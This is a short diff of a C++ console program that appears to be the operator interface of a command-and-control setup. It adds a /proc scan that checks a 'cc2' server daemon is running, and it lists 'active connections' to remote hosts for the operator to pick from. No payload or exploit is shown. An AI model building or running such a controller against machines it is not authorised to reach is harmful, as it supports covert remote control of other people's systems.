@@ -6,27 +6,63 @@
 #include <dirent.h>
 #include <vector>
 
-/*
-void int_handler(int s)
+pid_t proc_find(const char* name) 
 {
-	std::cout << "HANDLER" << std::endl;
-	intNum++;
-	pipeMutex.lock();
-	write (p,"exit\n",0x5);
-	pipeMutex.unlock();
-	if (intNum >= 2)
-	{
-		std::cout << " >= 2 ! " << std::endl;
-		exit(0xbeef);
-	}
+    DIR* dir;
+    struct dirent* ent;
+    char* endptr;
+    char buf[512];
+
+    if (!(dir = opendir("/proc"))) 
+    {
+        perror("can't open /proc");
+        return -1;
+    }
+    while((ent = readdir(dir)) != NULL) 
+    {
+        /* if endptr is not a null character, the directory is not
+         * entirely numeric, so ignore it */
+        long lpid = strtol(ent->d_name, &endptr, 10);
+        if (*endptr != '\0') 
+        {
+            continue;
+        }
+
+        /* try to open the cmdline file */
+        snprintf(buf, sizeof(buf), "/proc/%ld/cmdline", lpid);
+        FILE* fp = fopen(buf, "r");
+
+        if (fp) 
+        {
+            if (fgets(buf, sizeof(buf), fp) != NULL) 
+            {
+                /* check the first token in the file, the program name */
+                char* first = strtok(buf, " ");
+                if (!strcmp(first, name)) 
+                {
+                    fclose(fp);
+                    closedir(dir);
+                    return (pid_t)lpid;
+                }
+            }
+            fclose(fp);
+        }
+    }
+  	closedir(dir);
+    return -1;
 }
-*/
+
 int main (int argc,char ** argv)
 {
 
 	bool targetSelected = false;
 	while (1)
 	{
+		if (proc_find("/home/pi/Daemons/cc2") == -1)
+		{
+			std::cout << "\033[22;36m[!]\033[0m" << " cc server is not running, exiting..." << std::endl;
+			return -1;
+ 		}
 		std::vector <char *> connections;
 		std::cout << "\n\033[22;36m[*] Please select active connection: \033[0m" << std::endl;
 		DIR *d;
@@ -102,7 +138,7 @@ int main (int argc,char ** argv)
 						}
 						else if (r == 0)
 						{
-							std::cout << "[!] Connection closed by remote host" << std::endl;
+							std::cout << "[!] Connection closed by remote host or server is down" << std::endl;
 							targetSelected = false;
 							break;
 						}
